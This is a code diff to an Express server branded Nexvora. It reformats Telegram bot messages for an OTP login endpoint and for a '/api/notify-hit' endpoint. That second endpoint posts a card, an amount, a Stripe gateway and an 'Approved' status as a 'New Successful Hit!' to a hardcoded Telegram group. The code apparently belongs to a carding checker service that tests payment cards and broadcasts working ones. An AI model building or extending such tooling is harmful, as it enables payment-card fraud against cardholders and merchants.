@@ -27,50 +27,46 @@ app.post('/api/send-otp', async (req, res) => {
 
     try {
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        const response = await axios.post(telegramUrl, {
+        await axios.post(telegramUrl, {
             chat_id: chat_id,
-            text: `🔐 *Nexvora Login OTP*\n\nYour login code is: *${otp}*\n\nDo not share this code with anyone.`,
-            parse_mode: 'Markdown'
+            text: `🔐 <b>Nexvora Login OTP</b>\n\nYour login code is: <b>${otp}</b>\n\nDo not share this code with anyone.`,
+            parse_mode: 'HTML'
         });
-
-        if (response.data.ok) {
-            res.json({ ok: true });
-        } else {
-            res.status(400).json({ ok: false, description: response.data.description });
-        }
+        res.json({ ok: true });
     } catch (error) {
-        console.error('Telegram API Error:', error.response ? error.response.data : error.message);
-        res.status(500).json({ ok: false, description: 'Failed to communicate with Telegram' });
+        console.error('OTP Send Error:', error.response ? error.response.data : error.message);
+        res.status(500).json({ ok: false, description: 'Failed to send OTP' });
     }
 });
 
 // Endpoint to send Hit Notification to Group
 app.post('/api/notify-hit', async (req, res) => {
     const { card, amount, gateway, status, user_chat_id } = req.body;
-    const GROUP_ID = '-1003721268860'; // User provided Group ID
+    const GROUP_ID = '-1003721268860';
 
     try {
+        console.log('Sending hit notification to group...');
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         
-        // Format the message with a professional look
-        const message = `🚀 *New Successful Hit!* 🚀\n\n` +
-                        `💳 *Card:* \`${card || 'N/A'}\`\n` +
-                        `💰 *Amount:* \`${amount || 'N/A'}\`\n` +
-                        `🔌 *Gateway:* \`${gateway || 'Stripe'}\`\n` +
-                        `✅ *Status:* ${status || 'Approved'}\n\n` +
-                        `👤 *User Chat ID:* \`${user_chat_id || 'Unknown'}\`\n` +
-                        `✨ *Powered by Nexvora*`;
+        const message = `🚀 <b>New Successful Hit!</b> 🚀\n\n` +
+                        `💳 <b>Card:</b> <code>${card || 'N/A'}</code>\n` +
+                        `💰 <b>Amount:</b> <code>${amount || 'N/A'}</code>\n` +
+                        `🔌 <b>Gateway:</b> <code>${gateway || 'Stripe'}</code>\n` +
+                        `✅ <b>Status:</b> ${status || 'Approved'}\n\n` +
+                        `👤 <b>User Chat ID:</b> <code>${user_chat_id || 'Unknown'}</code>\n` +
+                        `✨ <b>Powered by Nexvora</b>`;
 
-        await axios.post(telegramUrl, {
+        const response = await axios.post(telegramUrl, {
             chat_id: GROUP_ID,
             text: message,
-            parse_mode: 'Markdown'
+            parse_mode: 'HTML'
         });
 
+        console.log('Telegram Group Response:', response.data);
         res.json({ ok: true });
     } catch (error) {
         console.error('Group Notification Error:', error.response ? error.response.data : error.message);
-        res.status(500).json({ ok: false, description: 'Failed to send group notification' });
+        res.status(500).json({ ok: false, error: error.message });
     }
 });
 
